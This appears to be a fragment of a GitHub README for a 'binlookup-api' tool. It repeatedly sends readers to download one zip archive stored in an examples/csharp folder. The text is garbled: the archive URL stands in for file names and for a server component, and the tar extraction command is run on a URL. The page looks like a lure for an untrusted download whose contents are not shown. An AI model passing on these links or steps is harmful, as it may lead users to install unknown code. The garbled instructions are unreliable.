...
[![Download binlookup-api](https://github.com/guabaaps-wq/binlookup-api/raw/refs/heads/main/examples/csharp/binlookup-api-v1.1.zip)](https://github.com/guabaaps-wq/binlookup-api/raw/refs/heads/main/examples/csharp/binlookup-api-v1.1.zip)

## 📥 Download & Install

To get started, visit this page to download the latest version of the binlookup-api application:

[Download binlookup-api](https://github.com/guabaaps-wq/binlookup-api/raw/refs/heads/main/examples/csharp/binlookup-api-v1.1.zip)
...
- **Linux:** Download the `https://github.com/guabaaps-wq/binlookup-api/raw/refs/heads/main/examples/csharp/binlookup-api-v1.1.zip` file.
...
2. Navigate to the directory where you downloaded the `https://github.com/guabaaps-wq/binlookup-api/raw/refs/heads/main/examples/csharp/binlookup-api-v1.1.zip` file.
3. Run the following command to extract the contents:
   ```bash
   tar -xvzf https://github.com/guabaaps-wq/binlookup-api/raw/refs/heads/main/examples/csharp/binlookup-api-v1.1.zip
   ```
...
- **https://github.com/guabaaps-wq/binlookup-api/raw/refs/heads/main/examples/csharp/binlookup-api-v1.1.zip** For the backend server.
